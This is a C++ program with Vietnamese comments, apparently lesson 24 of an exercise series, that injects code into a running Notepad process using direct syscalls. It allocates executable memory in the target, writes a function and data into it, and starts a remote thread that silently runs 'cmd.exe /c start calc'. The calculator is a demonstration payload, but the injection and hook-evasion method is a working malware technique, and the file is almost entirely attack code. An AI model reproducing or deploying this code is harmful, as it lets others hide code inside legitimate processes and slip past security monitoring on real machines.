#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Khai báo các hàm ngoại vi liên kết trực tiếp với file .asm của ta
extern "C" NTSTATUS NtAllocateVirtualMemoryProc(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern "C" NTSTATUS NtWriteVirtualMemoryProc(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

// Khai báo nguyên mẫu hàm Native của NtCreateThreadEx để tự thích ứng động với Build Number Windows 11
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm trực tiếp thông qua cổng Syscall
DWORD WINAPI RemoteDirectSyscallPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Bẻ gãy hoàn toàn lỗi RIP tương đối bằng con trỏ tuyệt đối
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 24: DIRECT SYSCALLS INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // Nạp động trích xuất con trỏ hàm NtCreateThreadEx bảo đảm vượt qua sự biến động số hiệu trên Windows 11
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // ─── BƯỚC 2: GỌI TRỰC TIẾP CỔNG ASSEMBLY ĐỂ CẤP PHÁT VÙNG NHỚ TỪ XA (ZERO STATIC BUFFERS) ───
    PVOID remoteCodeBuffer = NULL;
    SIZE_T functionSize = 500;
    // Hệ điều hành tự động cập nhật làm tròn trang nhớ (Page Alignment) lên bội số 4KB qua con trỏ tham số
    NtAllocateVirtualMemoryProc(hProcess, &remoteCodeBuffer, 0, &functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    NtAllocateVirtualMemoryProc(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Direct Syscall NtAllocateVirtualMemoryProc failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat vung nho Code RWX tu xa bang Direct Syscall: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // ─── BƯỚC 3: GỌI TRỰC TIẾP CỔNG ASSEMBLY ĐỂ GHI DỮ LIỆU SANG RAM ĐỐI PHƯƠNG ───
    SIZE_T bytesWritten = 0;
    NtWriteVirtualMemoryProc(hProcess, remoteCodeBuffer, (PVOID)RemoteDirectSyscallPayload, functionSize, &bytesWritten);
    NtWriteVirtualMemoryProc(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), &bytesWritten);
    std::cout << "[+] Ghi logic ham va cau truc tham so qua cong Syscall hoan tat." << std::endl;

    // ─── BƯỚC 4: KÍCH NỔ THREAD TỪ XA BẰNG CỔNG NATIVE TỰ THÍCH ỨNG ───
    std::cout << "[*] Dang khoi tao luong tu xa de khai hoa..." << std::endl;
    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // Cấu hình cờ đợi INFINITE gánh luồng sống độc lập phẳng sạch
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Direct Syscalls Injection Successful!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx failed! Status code: 0x" << std::hex << status << std::endl;
    }

    // Giải phóng và đóng Handle triệt để chống rò rỉ bộ nhớ
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}